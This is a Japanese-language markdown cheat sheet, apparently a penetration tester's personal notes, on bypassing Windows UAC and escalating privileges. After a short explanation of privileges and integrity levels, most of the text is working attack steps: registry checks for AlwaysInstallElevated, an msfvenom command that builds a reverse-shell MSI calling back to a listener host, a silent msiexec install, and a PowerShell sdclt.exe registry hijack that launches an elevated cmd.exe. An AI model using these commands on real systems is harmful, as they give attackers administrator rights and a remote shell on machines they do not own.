# UACBypass

## 権限を制御するOSの仕組み

* Windows UAC 端末の設定変更しようとした時に管理者権限が必要になるやつ
* Windowsでは、どのようにプロセスやオブジェクトの操作権限をコントロールしているのだろう？
  * Windows OSでは操作するシステムを制御するものとして、特権と整合性レベルがある。
  * 特権　ユーザ単位のアクセス制御　アクセストークンを使用して権限を有効化
  * 整合性レベル　オブジェクトのアクセス制御　アクセストークン内に格納されている
* CUIで攻撃をしている際にUACの回避が必要

### UACバイパス

Windows95～XPの場合：（UACが存在しないためUAC回避は不要）

Windows Vista、7の場合：「イベントビューワ」(eventvwr.exe)を利用したUAC回避手法

Windows 8～10の場合：「バックアップと復元」(sdclt.exe)を利用したUAC回避手法

* ビルトインAdministratorの奪取
* Windowsポリシーの悪用
* AlwaysInstallElevated ポリシーが有効 msiを実行すると特権でインストール

#### 手順(msiペイロード)

* AlwaysInstallElevatedの確認

``` bat
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    # AlwaysInstallElevated　REG_DWORD　0x1 であれば権限昇格に使える  
```

* payloadの作成

``` shell
    # リバースシェルを張るmsiファイルを作成。
    # msfvenomを使用
    # -fでファイル形式
    # -p でペイロード
    msfvenom -f msi -p windows/x64/shell_reverse_tcp LHOST=192.168.11.144 LPORT=1030 > evil.msi
```

* 作成したmsiファイルを配信する

``` bat
    # /quiet:進行状況バーのみを表示
    # /qn:何も表示しない
    # /i:インストーラーの指定
    msiexec /quiet /qn /i evil.msi
```

#### 手順(win10 sdclt.exe)

* UACMeで有効なexeファイルを検索

``` ps
    # default
    [String]$program = "C:\Windows\System32\cmd.exe"
    # Create Registory Structure
    New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Force
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Name "(default)" -Value $program -Force
    Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
    #Start sdclt.exe
    Start-Process "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden
    #Cleanup
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\App 
    Paths\control.exe" -Recurse -Force
```
